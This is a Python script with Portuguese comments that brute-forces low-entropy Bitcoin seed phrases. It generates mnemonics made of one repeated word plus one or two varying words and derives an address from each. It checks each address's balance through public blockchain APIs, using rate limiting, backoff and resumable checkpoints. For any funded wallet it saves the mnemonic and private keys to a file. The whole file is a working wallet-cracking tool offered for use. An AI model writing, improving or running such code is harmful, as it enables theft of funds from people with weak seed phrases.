#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
realfindbitcoin_hybrid_rate_limited_fixed.py
Versão corrigida do script híbrido (10+2 / 11+1), com:
 - rate limiting por-API
 - backoff + jitter + Retry-After
 - controle de filas/futures sem uso incorreto de as_completed().__next__()
 - preserva lógica original de geração e checkpoints
"""
import os
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import hmac
import hashlib
from mnemonic import Mnemonic
from bitcoin import privtopub, pubtoaddr, encode_privkey

# =========================
# CONFIGURAÇÃO (ajuste aqui)
# =========================
MODE = "hybrid"  # '10+2', '11+1', 'hybrid'
PALAVRA_BASE_PADRAO = "abandon"
mnemo = Mnemonic('english')
WORDLIST = mnemo.wordlist

API_DEFINITIONS = [
    ("https://api.blockcypher.com/v1/btc/main/addrs/{}", 1.0),
    ("https://mempool.space/api/address/{}", 2.0),
    # adicionar outras se quiser, ex:
    # ("https://blockstream.info/api/address/{}", 1.0),
]

CHECKPOINT_FILE = "checkpoint_hybrid.txt"
SALDO_FILE = "saldo.txt"
ULTIMO_FILE = "ultimo.txt"

MAX_WORKERS = 3
MAX_RETRIES = 6
BACKOFF_BASE = 2.0
JITTER = 0.25

RATE_ADJUST_WINDOW = 30.0
GLOBAL_429_THRESHOLD = 8
GLOBAL_PAUSE_SECONDS = 20.0

# =========================
# Utilitários de arquivos
# =========================
def save_checkpoint(mode, base_word, var1_idx, var2_idx):
    try:
        with open(CHECKPOINT_FILE, "w", encoding="utf-8") as f:
            f.write(f"{mode}\n{base_word}\n{var1_idx}\n{var2_idx}\n{time.time()}\n")
    except Exception as e:
        print(f"❌ Erro salvando checkpoint: {e}")

def load_checkpoint():
    if not os.path.exists(CHECKPOINT_FILE):
        return MODE, PALAVRA_BASE_PADRAO, 0, 0
    try:
        with open(CHECKPOINT_FILE, "r", encoding="utf-8") as f:
            lines = [l.strip() for l in f.readlines() if l.strip()]
            if len(lines) >= 4:
                mode = lines[0]
                base_word = lines[1]
                var1_idx = int(lines[2])
                var2_idx = int(lines[3])
                return mode, base_word, var1_idx, var2_idx
    except Exception:
        pass
    return MODE, PALAVRA_BASE_PADRAO, 0, 0

def save_last_combo(base_word, var1_word, var2_word=None):
    try:
        with open(ULTIMO_FILE, "w", encoding="utf-8") as f:
            if var2_word is None:
                mnemonic = " ".join([base_word]*11 + [var1_word])
            else:
                mnemonic = " ".join([base_word]*10 + [var1_word, var2_word])
            f.write(mnemonic)
    except Exception as e:
        print(f"❌ Erro salvando ultimo combo: {e}")

def save_wallet_with_balance(mnemonic, address, wif, hex_key, pub_key, balance, api_name):
    try:
        with open(SALDO_FILE, "a", encoding="utf-8") as f:
            f.write("="*80 + "\n")
            f.write("💎 CARTEIRA COM SALDO ENCONTRADA\n")
            f.write(f"Modo: {MODE}\n")
            f.write(f"Mnemonic: {mnemonic}\n")
            f.write(f"Endereço: {address}\n")
            f.write(f"Saldo: {balance:.8f} BTC (API: {api_name})\n")
            f.write(f"WIF: {wif}\n")
            f.write(f"PrivHex: {hex_key}\n")
            f.write(f"PubKey: {pub_key}\n")
            f.write("-"*80 + "\n\n")
    except Exception as e:
        print(f"❌ Erro salvando saldo: {e}")

# =========================
# Api limiter / adaptive
# =========================
class ApiLimiter:
    def __init__(self, initial_rate):
        self.rate = float(max(0.1, initial_rate))
        self.capacity = self.rate
        self.tokens = self.capacity
        self.last = time.time()
        self.lock = threading.Lock()
        self.recent_429 = []

    def acquire(self):
        while True:
            with self.lock:
                now = time.time()
                delta = now - self.last
                if delta > 0:
                    self.tokens = min(self.capacity, self.tokens + delta * self.rate)
                    self.last = now
                if self.tokens >= 1.0:
                    self.tokens -= 1.0
                    return
                needed = (1.0 - self.tokens) / max(self.rate, 0.0001)
            time.sleep(max(0.01, needed * 0.5) + random.uniform(0, 0.01))

    def note_429(self):
        with self.lock:
            ts = time.time()
            self.recent_429.append(ts)
            cutoff = ts - RATE_ADJUST_WINDOW
            self.recent_429 = [t for t in self.recent_429 if t >= cutoff]

    def get_recent_429_count(self):
        with self.lock:
            ts = time.time()
            cutoff = ts - RATE_ADJUST_WINDOW
            self.recent_429 = [t for t in self.recent_429 if t >= cutoff]
            return len(self.recent_429)

    def adjust_rate(self):
        with self.lock:
            recent = self.get_recent_429_count()
            if recent >= 3:
                new_rate = max(self.rate * 0.4, 0.1)
            elif recent > 0:
                new_rate = max(self.rate * 0.75, 0.1)
            else:
                new_rate = min(self.rate * 1.05 + 0.05, 20.0)
            if abs(new_rate - self.rate) / max(self.rate,1e-9) > 0.01:
                prop = self.tokens / self.capacity if self.capacity>0 else 1.0
                self.rate = new_rate
                self.capacity = max(1.0, self.rate)
                self.tokens = min(self.capacity, prop * self.capacity)

API_LIMITERS = [ApiLimiter(rate) for (_, rate) in API_DEFINITIONS]
GLOBAL_429_HISTORY = []
GLOBAL_429_LOCK = threading.Lock()

def global_note_429():
    with GLOBAL_429_LOCK:
        ts = time.time()
        GLOBAL_429_HISTORY.append(ts)
        cutoff = ts - RATE_ADJUST_WINDOW
        while GLOBAL_429_HISTORY and GLOBAL_429_HISTORY[0] < cutoff:
            GLOBAL_429_HISTORY.pop(0)

def get_global_429_count():
    with GLOBAL_429_LOCK:
        ts = time.time()
        cutoff = ts - RATE_ADJUST_WINDOW
        GLOBAL_429_HISTORY[:] = [t for t in GLOBAL_429_HISTORY if t >= cutoff]
        return len(GLOBAL_429_HISTORY)

# =========================
# HTTP session
# =========================
session = requests.Session()
adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
session.mount("https://", adapter)
session.mount("http://", adapter)
session.headers.update({"User-Agent": "realfindbitcoin_hybrid/1.0"})

# =========================
# chave a partir do mnemonic
# =========================
def generate_key_data_from_mnemonic(mnemonic):
    try:
        seed = mnemo.to_seed(mnemonic, passphrase="")
        I = hmac.new(b"Bitcoin seed", seed, hashlib.sha512).digest()
        master_priv_key = I[:32]
        wif = encode_privkey(master_priv_key, 'wif_compressed')
        pub_key = privtopub(master_priv_key)
        address = pubtoaddr(pub_key)
        hex_key = master_priv_key.hex()
        return address, wif, hex_key, pub_key
    except Exception:
        return None, None, None, None

# =========================
# consulta APIs com backoff
# =========================
def query_apis_for_address(address):
    for idx, (url_template, _) in enumerate(API_DEFINITIONS):
        limiter = API_LIMITERS[idx]
        api_name = url_template.split("//")[1].split("/")[0]
        for attempt in range(MAX_RETRIES):
            if get_global_429_count() >= GLOBAL_429_THRESHOLD:
                print(f"🟠 Muitas 429s globais ({get_global_429_count()}). Pausa global {int(GLOBAL_PAUSE_SECONDS)}s.")
                time.sleep(GLOBAL_PAUSE_SECONDS)
                for lim in API_LIMITERS:
                    lim.adjust_rate()
            limiter.acquire()
            try:
                url = url_template.format(address)
                resp = session.get(url, timeout=10)
                if resp.status_code == 429:
                    limiter.note_429()
                    global_note_429()
                    retry_after = None
                    if 'Retry-After' in resp.headers:
                        try:
                            retry_after = float(resp.headers.get('Retry-After'))
                        except:
                            retry_after = None
                    if retry_after and retry_after > 0:
                        sleep_time = retry_after + random.uniform(0.1, 0.6)
                    else:
                        sleep_time = (BACKOFF_BASE ** attempt) * (0.5 + random.random() * JITTER)
                    print(f"🟡 429 em {api_name}: backoff {sleep_time:.2f}s (attempt {attempt+1}/{MAX_RETRIES})")
                    time.sleep(sleep_time)
                    limiter.adjust_rate()
                    continue
                resp.raise_for_status()
                data = resp.json()
                balance_satoshi = 0
                if "blockcypher.com" in url_template:
                    balance_satoshi = data.get('balance', 0)
                elif "mempool.space" in url_template:
                    chain_stats = data.get('chain_stats', {})
                    funded = chain_stats.get('funded_txo_sum', 0)
                    spent = chain_stats.get('spent_txo_sum', 0)
                    balance_satoshi = max(0, funded - spent)
                    if balance_satoshi == 0:
                        balance_satoshi = data.get('balance', 0)
                else:
                    balance_satoshi = data.get('final_balance', data.get('balance', 0))
                balance_btc = balance_satoshi / 1e8 if balance_satoshi else 0.0
                if balance_btc > 0:
                    return True, balance_btc, api_name
                break
            except requests.exceptions.RequestException as e:
                sleep_time = (BACKOFF_BASE ** attempt) * (0.2 + random.random() * JITTER)
                print(f"❌ Erro conexão {api_name}: {e}. Retentando em {sleep_time:.2f}s (attempt {attempt+1}/{MAX_RETRIES})")
                time.sleep(sleep_time)
                continue
            except ValueError:
                break
    return False, 0.0, None

# =========================
# validação e contador
# =========================
VALID_BIP39_COUNT = 0
FOUND_WITH_BALANCE = 0
TOTAL_TESTS = 0
lock_counters = threading.Lock()

def check_wallet_balance_mnemonic(mnemonic):
    global VALID_BIP39_COUNT, FOUND_WITH_BALANCE, TOTAL_TESTS
    if not mnemo.check(mnemonic):
        with lock_counters:
            TOTAL_TESTS += 1
        return False, 0.0
    with lock_counters:
        VALID_BIP39_COUNT += 1
        TOTAL_TESTS += 1
    address, wif, hex_key, pub_key = generate_key_data_from_mnemonic(mnemonic)
    if not address:
        return False, 0.0
    found, balance, api_name = query_apis_for_address(address)
    if found:
        with lock_counters:
            FOUND_WITH_BALANCE += 1
        save_wallet_with_balance(mnemonic, address, wif, hex_key, pub_key, balance, api_name)
        return True, balance
    return False, 0.0

# =========================
# Iterators (determinísticos)
# =========================
def iter_11_plus_1_from(base_idx, var_idx_start):
    for i in range(base_idx, len(WORDLIST)):
        base_word = WORDLIST[i]
        start_j = var_idx_start if i == base_idx else 0
        for j in range(start_j, len(WORDLIST)):
            mnemonic = " ".join([base_word]*11 + [WORDLIST[j]])
            yield i, j, mnemonic

def iter_10_plus_2_from(base_idx, var1_idx_start, var2_idx_start):
    for i in range(base_idx, len(WORDLIST)):
        base_word = WORDLIST[i]
        start_j = var1_idx_start if i == base_idx else 0
        for j in range(start_j, len(WORDLIST)):
            start_k = var2_idx_start if (i == base_idx and j == start_j) else 0
            for k in range(start_k, len(WORDLIST)):
                mnemonic = " ".join([base_word]*10 + [WORDLIST[j], WORDLIST[k]])
                yield i, j, k, mnemonic

# =========================
# main
# =========================
def main():
    global MODE
    print("Inicializando (fixed) - hybrid rate-limited")
    mode_ck, base_word_ck, var1_idx_ck, var2_idx_ck = load_checkpoint()
    if mode_ck:
        MODE = mode_ck
    print(f"Modo: {MODE}. Continuando da base '{base_word_ck}', indices {var1_idx_ck},{var2_idx_ck}")

    try:
        base_idx = WORDLIST.index(base_word_ck)
    except ValueError:
        base_idx = 0

    patterns = []
    if MODE == "10+2":
        patterns = ["10+2"]
    elif MODE == "11+1":
        patterns = ["11+1"]
    else:
        patterns = ["11+1", "10+2"]

    executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
    futures = []
    total_tested_local = 0

    try:
        for pattern in patterns:
            if pattern == "11+1":
                it = iter_11_plus_1_from(base_idx, var1_idx_ck)
                for i, j, mnemonic in it:
                    save_last_combo(WORDLIST[i], WORDLIST[j], None)
                    save_checkpoint("11+1", WORDLIST[i], j, 0)
                    # controlar fila de futures: esperar até liberar 1 slot
                    while len(futures) >= MAX_WORKERS * 3:
                        # processar futures concluídas
                        for f in futures[:]:
                            if f.done():
                                try:
                                    f.result()
                                except Exception:
                                    pass
                                futures.remove(f)
                        time.sleep(0.05)
                    futures.append(executor.submit(check_wallet_balance_mnemonic, mnemonic))
                    total_tested_local += 1
                    if total_tested_local % 100 == 0:
                        print(f"[11+1] Testadas {total_tested_local} combinações | Última: {mnemonic}")
                        save_checkpoint("11+1", WORDLIST[i], j, 0)
                    time.sleep(0.001)

            elif pattern == "10+2":
                it = iter_10_plus_2_from(base_idx, var1_idx_ck, var2_idx_ck)
                for i, j, k, mnemonic in it:
                    save_last_combo(WORDLIST[i], WORDLIST[j], WORDLIST[k])
                    save_checkpoint("10+2", WORDLIST[i], j, k)
                    while len(futures) >= MAX_WORKERS * 3:
                        for f in futures[:]:
                            if f.done():
                                try:
                                    f.result()
                                except Exception:
                                    pass
                                futures.remove(f)
                        time.sleep(0.05)
                    futures.append(executor.submit(check_wallet_balance_mnemonic, mnemonic))
                    total_tested_local += 1
                    if total_tested_local % 100 == 0:
                        print(f"[10+2] Testadas {total_tested_local} combinações | Última: {mnemonic}")
                        save_checkpoint("10+2", WORDLIST[i], j, k)
                    time.sleep(0.001)

            # reset start indices after finishing pattern
            base_idx = 0
            var1_idx_ck = 0
            var2_idx_ck = 0

            # process remaining futures while adjusting API rates
            while futures:
                for f in futures[:]:
                    if f.done():
                        try:
                            f.result()
                        except Exception:
                            pass
                        futures.remove(f)
                for lim in API_LIMITERS:
                    lim.adjust_rate()
                time.sleep(0.2)

    except KeyboardInterrupt:
        print("Interrompido pelo usuário — salvando checkpoint...")
        executor.shutdown(wait=False)
        return
    finally:
        executor.shutdown(wait=True)
        print("Execução concluída. Estatísticas:")
        print(f"Total testados: {TOTAL_TESTS}")
        print(f"Válidos BIP39: {VALID_BIP39_COUNT}")
        print(f"Com saldo: {FOUND_WITH_BALANCE}")

if __name__ == "__main__":
    main()
